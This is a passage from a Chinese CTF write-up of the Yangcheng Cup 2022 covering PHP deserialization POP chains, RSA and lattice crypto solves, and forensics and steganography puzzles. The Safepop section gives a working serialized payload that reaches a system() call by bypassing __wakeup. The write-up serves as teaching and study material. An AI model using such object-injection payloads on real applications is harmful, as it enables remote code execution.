class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line"><span class="variable">$y</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$y1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c1=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b1=<span class="variable">$y</span>;</span><br><span class="line"><span class="variable">$y</span>-&gt;y1=<span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;cheng&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;c1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;bei&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;b1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;yang&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;y1&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;b2&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(11).PNG" alt="1280X1280 (11)"></p>
<h3 id="Safepop">Safepop</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=[<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;getFlag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;p=<span class="string">&quot;getFlag&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="variable">$f</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot; Fun func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>这个题一看就是需要去调那个<code>getFlag</code>方法，但是这里<code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>看到了过滤说明直接调用肯定是不行的，所以我们是需要通过Fun类的回调函数去调用的，这样就可以绕过过滤。</p>
<p>同时还有个问题就是weakup，看了一眼php版本，php7.3可能是还有绕过，不然这题没法做了。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(12).PNG" alt="1280X1280 (12)"></p>
<p>然后我们就是需要挖链子，这里还有个小问题就是<code>throw new Exception(&quot;no pop&quot;);</code>会抛出异常，绕过他的方式是要让反序列化的内容有错，这里我一直习惯是用数组去改绕过，但是因为这里最后是要改大小绕weakup的所以不用数组也行。这里<code>$b-&gt;p=&quot;getFlag&quot;;</code>也不需要一定赋值<code>getFlag</code>，只要是随便一个B里面没有的方法就行，这里一开始是直接调的Test，所以赋了这个，懒得改了，这里私有方法记得加%00或者url编码一下。还有要改一下B那里改大一点，改成了3.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pop=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Fun&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00Fun%00func&quot;</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(13).PNG" alt="img"></p>
<h2 id="Crypto-5">Crypto</h2>
<h3 id="EasyRsa">EasyRsa</h3>
<p>唔，找到一个素数因子，直接分解n。然后就是常规操作，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">file  = <span class="string">&quot;D:\\桌面\\CRYPTO附件\\task\\output.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    A.append(n)</span><br><span class="line">A = A[::-<span class="number">1</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c=<span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c,d,n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A:</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="keyword">assert</span> p*q == n</span><br><span class="line">    phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">    d = inverse(e,phi)</span><br><span class="line">    m = decrypt(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(m,e,n)==c)</span><br><span class="line">    c = m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>
<h3 id="LRSA"><strong>LRSA</strong></h3>
<p>根据</p>
<p>$$<br>
(p-58)*P+q-t - kQ=0<br>
$$<br>
构造格子</p>
<p>$$<br>
\begin{pmatrix}<br>
1 &amp; 0 &amp; P\<br>
0 &amp; 1 &amp; 1\<br>
0 &amp; 0 &amp; Q<br>
\end{pmatrix}<br>
$$<br>
我们需要的向量(p-58,q-44,k)量级大概在1024bit，那么需要对我们构造的lattice进行放大</p>
<p>$$<br>
\begin{pmatrix} 1 &amp; 0 &amp; 2^{1017}P\  0 &amp; 1 &amp; 2^{1017}\ 0 &amp; 0 &amp; 2^{1017}Q \end{pmatrix}<br>
$$<br>
使用LLL算法得到(p-58,q-44,k)，即可分解n。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">B=<span class="number">1023</span></span><br><span class="line">PPQ=<span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ=<span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t=<span class="number">44</span></span><br><span class="line">c=<span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">PQ = gmpy2.gcd(PPQ,PQQ)</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">p = <span class="number">80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137205</span>+<span class="number">58</span></span><br><span class="line">q = <span class="number">71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586407</span>+<span class="number">44</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,p*q)))</span><br></pre></td></tr></table></figure>
<h2 id="Misc-3">Misc</h2>
<h3 id="签到">签到</h3>
<p>直接ciphey识别解码就OK</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/14.png" alt="14"></p>
<h3 id="where-is-secret">where_is_secret</h3>
<p>拿到附件，vig.txt的内容一眼丁真，vigenere编码（<a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver%EF%BC%89%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%8B%BF%E5%88%B0%E8%A7%A3%E5%BC%80%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%BE%97%E5%88%B0%E4%B8%80%E5%BC%A0bmp%E5%9B%BE%E7%89%87%EF%BC%8C%E7%BB%93%E5%90%88hint%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%86%99%E8%AF%BB%E5%83%8F%E7%B4%A0%E7%82%B9%E8%84%9A%E6%9C%AC">https://www.guballa.de/vigenere-solver）在线解密，拿到解开压缩包得到一张bmp图片，结合hint的脚本，写读像素点脚本</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">text</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;out.bmp&quot;</span>)</span><br><span class="line">    imgdata = np.array(img)</span><br><span class="line">    index = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">            m = <span class="built_in">int</span>(imgdata[x][y][<span class="number">1</span>])</span><br><span class="line">            n = <span class="built_in">int</span>(imgdata[x][y][<span class="number">2</span>])</span><br><span class="line">            <span class="built_in">str</span> = m&lt;&lt;<span class="number">8</span></span><br><span class="line">            <span class="built_in">str</span> += n</span><br><span class="line">            file.write(<span class="built_in">chr</span>(<span class="built_in">str</span>))</span><br><span class="line">    file.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    decode()</span><br></pre></td></tr></table></figure>
<p>打开输出的文本，发现flag被打散在文本中，写一个字母识别脚本,懒了，没写正则。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file=<span class="string">&#x27;D:\\桌面\\829962.txt&#x27;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = string.ascii_letters+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;3&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">var = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        var += i</span><br><span class="line"><span class="built_in">print</span>(var)</span><br></pre></td></tr></table></figure>
<p>获得串flag</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/15.png" alt="15"></p>
<p>结合特征</p>
<p>flag{h1d3_1n_th3_p1ctur3}</p>
<h3 id="迷失幻境">迷失幻境</h3>
<p>打卡压缩包，是虚拟磁盘镜像，取证大师挂载，查看回收站有一个jpg和一个45文件。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/16.png" alt="16"></p>
<p>查看45文件发现PNG格式特征</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/17.png" alt="17"></p>
<p>补充文件头，然后与给的100张图片中随便选一张用stegslove里的Image combiner，获得一窜字符“Key is 可莉前来报到”，猜测可爱可莉.jpg就是加密的图片，轮番试过之后，用outguess解出flag</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/18.png" alt="18"></p>
<p>DASCTF{f473a6fd2de17a0c5794414b3905ebbe}</p>
<h3 id="躲猫猫">躲猫猫</h3>
<p>打开题目附件，用wireshark打开，读取http报文，发现一个PNG特征格式的文件</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/19.png" alt="img"></p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/20.png" alt="img"></p>
<p>下载获得一张灰色的PNG</p>
<p>接着读报文，FTP拿到一个加密压缩包，发现key.log没有加密，查看内容，通过查询是用来解密TLS流量的。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/21.png" alt="img"></p>
<p>解密TLS流量之后获得一张JPG图片</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/22.png" alt="img"></p>
<p>内容是压缩包的解压密码。解压后的脚本是对原图的像素重计算，编写脚本恢复原图。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">image = cv2.imread(<span class="string">&quot;hide.png&quot;</span>)</span><br><span class="line">imagearray = array(image)</span><br><span class="line"> </span><br><span class="line">x,y = <span class="number">5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span>,<span class="number">6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span></span><br><span class="line"> </span><br><span class="line">h,w = <span class="number">1800</span>,<span class="number">1800</span></span><br><span class="line"> </span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">     